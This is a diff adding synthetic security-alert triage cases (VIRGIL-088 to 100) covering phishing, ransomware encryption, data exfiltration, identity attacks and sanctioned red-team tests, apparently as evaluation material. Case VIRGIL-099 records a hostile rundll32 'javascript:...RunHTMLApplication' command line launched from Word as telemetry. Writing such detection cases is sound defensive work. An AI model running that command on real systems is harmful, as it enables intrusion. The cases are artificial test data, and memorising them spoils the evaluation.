+      "macro_unsigned": true,
+      "external_sender": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-088",
+    "alert": {
+      "rule": "Password-Protected Archive Attachment",
+      "severity": "high",
+      "risk_score": 66
+    },
+    "email": {
+      "sender": "legal@known-vendor.example",
+      "display_name": "Outside Counsel",
+      "recipients": 3,
+      "subject": "Discovery package",
+      "attachment": "evidence.zip"
+    },
+    "trigger": {
+      "event": "encrypted_archive_received"
+    },
+    "enrichment": {
+      "vendor_known": true,
+      "sender_spf_dkim_pass": true,
+      "archive_password_in_separate_email": true,
+      "files_inside_not_scanned": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-089",
+    "alert": {
+      "rule": "User Clicked Newly Registered Domain",
+      "severity": "medium",
+      "risk_score": 52
+    },
+    "user": {
+      "name": "sophia",
+      "role": "HR Manager",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "url_click",
+      "url": "https://benefits-newportal.example/login"
+    },
+    "enrichment": {
+      "domain_age_days": 9,
+      "domain_owned_by_approved_vendor": true,
+      "tls_certificate_valid": true,
+      "sso_redirect_matches_expected": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-090",
+    "alert": {
+      "rule": "Credential Phishing Link Clicked",
+      "severity": "critical",
+      "risk_score": 94
+    },
+    "user": {
+      "name": "ethan",
+      "role": "Sales Manager",
+      "is_admin": false
+    },
+    "host": {
+      "name": "SALES-WS-22",
+      "role": "sales_workstation",
+      "criticality": "medium"
+    },
+    "trigger": {
+      "event": "url_click",
+      "url": "https://microsoft-login-security.example/verify"
+    },
+    "enrichment": {
+      "lookalike_brand_domain": true,
+      "domain_age_days": 1,
+      "credential_form_detected": true,
+      "user_submitted_form": true
+    },
+    "correlated_activity": {
+      "new_login_after_click": true,
+      "new_country_login": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-091",
+    "alert": {
+      "rule": "Suspicious Redirect Chain",
+      "severity": "high",
+      "risk_score": 67
+    },
+    "user": {
+      "name": "grace",
+      "role": "Recruiter",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "url_click",
+      "url": "https://short.example/AbC123",
+      "redirect_count": 4
+    },
+    "enrichment": {
+      "final_domain_first_seen_days": 17,
+      "final_domain_category": "job_portal",
+      "file_downloaded": false,
+      "credential_submission_observed": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-092",
+    "alert": {
+      "rule": "Mass File Read Activity",
+      "severity": "high",
+      "risk_score": 70
+    },
+    "host": {
+      "name": "FILE-02",
+      "role": "department_file_server",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "svc-indexer",
+      "role": "Enterprise Search Indexer",
+      "is_admin": true
+    },
+    "trigger": {
+      "event": "files_read",
+      "file_count_10m": 48320,
+      "shares_accessed": 12
+    },
+    "enrichment": {
+      "service_account_expected": true,
+      "scheduled_index_window": true,
+      "pattern_seen_weekly": true,
+      "file_modifications": 0
+    }
+  },
+  {
+    "case_id": "VIRGIL-093",
+    "alert": {
+      "rule": "Mass File Encryption Behavior",
+      "severity": "critical",
+      "risk_score": 99
+    },
+    "host": {
+      "name": "FILE-07",
+      "role": "shared_file_server",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "jordan",
+      "role": "Operations User",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "files_modified",
+      "file_count_5m": 16741,
+      "new_extension": ".locked"
+    },
+    "enrichment": {
+      "process": "invoice_viewer.exe",
+      "binary_signed": false,
+      "shadow_copy_deletion_detected": true,
+      "approved_bulk_operation": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-094",
+    "alert": {
+      "rule": "Unusual Bulk File Access",
+      "severity": "high",
+      "risk_score": 74
+    },
+    "host": {
+      "name": "RND-FS-01",
+      "role": "research_file_server",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "researcher9",
+      "role": "Senior Researcher",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "files_read",
+      "file_count_30m": 9120,
+      "shares_accessed": 4
+    },
+    "enrichment": {
+      "user_baseline_files_30m": 380,
+      "project_deadline_days": 1,
+      "employment_end_date_days": null,
+      "archive_created": true,
+      "external_upload_observed": false
+    }
+  },
+  {
+    "case_id": "VIRGIL-095",
+    "alert": {
+      "rule": "USB Mass Storage Usage",
+      "severity": "medium",
+      "risk_score": 55
+    },
+    "host": {
+      "name": "FORENSICS-01",
+      "role": "forensics_workstation",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "ir.analyst",
+      "role": "Incident Responder",
+      "is_admin": true
+    },
+    "trigger": {
+      "event": "usb_storage_mounted",
+      "device": "EncryptedUSB-CaseKit"
+    },
+    "enrichment": {
+      "security_exception_approved": true,
+      "device_serial_allowlisted": true,
+      "case_ticket_match": true,
+      "encryption_enabled": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-096",
+    "alert": {
+      "rule": "Sensitive Data Uploaded to Personal Cloud",
+      "severity": "high",
+      "risk_score": 91
+    },
+    "host": {
+      "name": "DEV-WS-07",
+      "role": "developer_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "dev.contractor",
+      "role": "Contractor",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "cloud_upload",
+      "destination": "personal-drive.example",
+      "bytes": 2147483648
+    },
+    "enrichment": {
+      "destination_unsanctioned": true,
+      "files_classification": "restricted_source_code",
+      "approved_exception": false,
+      "employment_end_date_days": 3
+    }
+  },
+  {
+    "case_id": "VIRGIL-097",
+    "alert": {
+      "rule": "Unapproved Remote Access Tool",
+      "severity": "medium",
+      "risk_score": 63
+    },
+    "host": {
+      "name": "SUPPORT-WS-12",
+      "role": "support_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "support.lead",
+      "role": "Support Lead",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "RemoteHelpPlus.exe",
+      "event": "remote_access_session_started"
+    },
+    "enrichment": {
+      "tool_not_on_approved_list": true,
+      "vendor_security_review": "pending",
+      "manager_approval": true,
+      "customer_support_use_case": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-098",
+    "alert": {
+      "rule": "Coordinated Identity Attack",
+      "severity": "critical",
+      "risk_score": 99
+    },
+    "host": {
+      "name": "IDENTITY",
+      "role": "identity_platform",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "vp.finance",
+      "role": "Vice President Finance",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "password_spray_then_mfa_fatigue",
+      "accounts_targeted": 96,
+      "mfa_pushes_target_user": 12
+    },
+    "enrichment": {
+      "source_country_new": true,
+      "device_new": true,
+      "successful_login": true,
+      "impossible_travel": true,
+      "user_reported_activity": false
+    },
+    "correlated_activity": {
+      "oauth_consent_added": true,
+      "mailbox_forwarding_rule_created": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-099",
+    "alert": {
+      "rule": "Multi-Stage Endpoint Intrusion",
+      "severity": "critical",
+      "risk_score": 99
+    },
+    "host": {
+      "name": "ENG-WS-71",
+      "role": "engineering_workstation",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "engineer4",
+      "role": "Engineer",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "rundll32.exe",
+      "parent": "WINWORD.EXE",
+      "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""
+    },
+    "network": {
+      "destination": "203.0.113.91:443",
+      "destination_internal": false
+    },
+    "enrichment": {
+      "document_from_external_email": true,
+      "binary_seen_before": false,
+      "approved_change": false
+    },
+    "correlated_activity": {
+      "scheduled_task_created": true,
+      "periodic_beaconing": true,
+      "large_outbound_upload": true
+    }
+  },
+  {
+    "case_id": "VIRGIL-100",
+    "alert": {
+      "rule": "Multiple High-Risk Behaviors Detected",
+      "severity": "critical",
+      "risk_score": 98
+    },
+    "host": {
+      "name": "PURPLE-LAB-01",
+      "role": "security_test_endpoint",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "redteam.operator",
+      "role": "Authorized Red Team",
+      "is_admin": true
+    },
+    "trigger": {
+      "event": "credential_dump_lateral_movement_and_c2_simulation",
+      "techniques": [
+        "credential_access",
+        "lateral_movement",
+        "persistence",
+        "beaconing"
+      ]
+    },
+    "enrichment": {
+      "approved_security_test": true,
+      "scope_match": true,
+      "test_window_active": true,
+      "source_host_allowlisted": true,
+      "ticket_match": true
+    },
+    "correlated_activity": {
+      "soc_notified_before_test": true,
+      "production_assets_out_of_scope": true
+    }
+  }
+]
